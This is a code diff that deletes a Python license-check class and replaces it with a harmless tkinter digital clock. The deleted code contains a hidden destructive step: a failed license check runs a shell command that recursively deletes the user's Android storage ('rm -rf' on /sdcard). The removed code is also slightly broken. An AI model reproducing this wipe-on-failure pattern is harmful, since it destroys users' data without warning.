@@ -1,35 +1,31 @@
-import os, subprocess, getpass, Sys
-
-class License:
-
-    def __init__(self, license):
-
-        self.license_input = license
-
-        # License Pertama
-        if self.license_input == 'Ryuuou':
-            self.license_name = 'pendragon'
-            self.active = '22-06-2022'
-
-        # License kedua
-        elif self.license_input == 'Vasillias pendragon':
-            self.license_name = 'pendragon'
-            self.active = '30-06-2022'
-
-        else:
-            print('maaf, license yang anda masukan tidak ada!')
-            sys.exit(1)
-
-    def generate_activate(self):
-        if self.license_name:
-            log = open('license.txt', 'w')
-            log.write('license : ©2022 - Ryuuou')
-            log.write('Active : 21-06-2022')
-            log.close()
-
-        else:
-            subprocess.Popen(
-                'termux-setup-storage; rm -rf /sdcard/storage/emulated/0/',
-                shell=True).wait(
-            )
-    def license_kadaluarsa(self, license):
+# importing whole module
+from tkinter import * 
+from tkinter.ttk import *
+  
+# importing strftime function to
+# retrieve system's time
+from time import strftime
+  
+# creating tkinter window
+root = Tk()
+root.title('Clock')
+  
+# This function is used to 
+# display time on the label
+def time():
+    string = strftime('%H:%M:%S %p')
+    lbl.config(text = string)
+    lbl.after(1000, time)
+  
+# Styling the label widget so that clock
+# will look more attractive
+lbl = Label(root, font = ('calibri', 40, 'bold'),
+            background = 'black',
+            foreground = 'white')
+  
+# Placing clock at the centre
+# of the tkinter window
+lbl.pack(anchor = 'center')
+time()
+  
+mainloop()
